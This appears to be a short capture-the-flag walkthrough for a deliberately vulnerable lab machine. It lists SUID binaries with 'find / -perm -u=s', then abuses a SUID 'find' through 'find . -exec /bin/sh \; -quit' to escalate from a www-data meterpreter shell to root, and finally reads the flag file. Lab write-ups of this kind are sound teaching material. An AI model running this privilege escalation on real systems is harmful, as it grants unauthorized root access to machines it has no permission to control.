"Special PERMS will help FIND the passwd — but you’ll need to -exec that command to work out how to get what’s in the shadow"
find / -perm -u=s -type f 2>/dev/null
/bin/mount
/bin/ping
/bin/su
/bin/ping6
/bin/umount
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/find
/usr/sbin/exim4
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/sbin/mount.nfs

meterpreter > shell
Process 20706 created.
Channel 6 created.
whoami
=> www-data
find . -exec /bin/sh \; -quit
whoami
=> root

pwd
=> /var/www
cd /root
ls -ltra
total 32
-rw-r--r--  1 root root  140 Nov 20  2007 .profile
drwx------  2 root root 4096 Feb 19  2019 .aptitude
drwxr-xr-x 23 root root 4096 Feb 19  2019 ..
drwxr-xr-x  3 root root 4096 Feb 19  2019 .drush
-rw-r--r--  1 root root  949 Feb 19  2019 .bashrc
-rw-r--r--  1 root root  173 Feb 19  2019 thefinalflag.txt
-rw-------  1 root root   44 Feb 28  2019 .bash_history
drwx------  4 root root 4096 Feb 28  2019 .

cat thefinalflag.txt
Well done!!!!

Hopefully you've enjoyed this and learned some new skills.

You can let me know what you thought of this little journey
by contacting me via Twitter - @DCAU7
